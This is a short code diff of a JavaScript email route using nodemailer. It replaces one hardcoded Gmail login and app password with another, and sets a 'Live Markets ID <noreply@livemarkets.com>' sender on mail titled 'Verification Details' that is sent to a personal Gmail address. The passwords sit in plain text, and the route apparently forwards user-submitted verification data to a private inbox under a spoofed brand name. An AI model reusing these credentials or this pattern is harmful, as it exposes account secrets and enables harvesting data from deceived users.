@@ -11,8 +11,8 @@ export async function POST(request) {
   const transporter = nodemailer.createTransport({
     service: "gmail",
     auth: {
-      user: "osr.cty@gmail.com",
-      pass: "btzbcklyxerxvkiy",
+      user: "livemarketsfx@gmail.com",
+      pass: "qoxw cwck diqf etuh",
     },
   });
 
@@ -90,7 +90,7 @@ export async function POST(request) {
 
   // Email options
   const mailOptions = {
-    from: "osr.cty@gmail.com",
+    from: "Live Markets ID <noreply@livemarkets.com>",
     to: "samsonrichfield@gmail.com",
     subject: "Verification Details",
     html: emailContent,
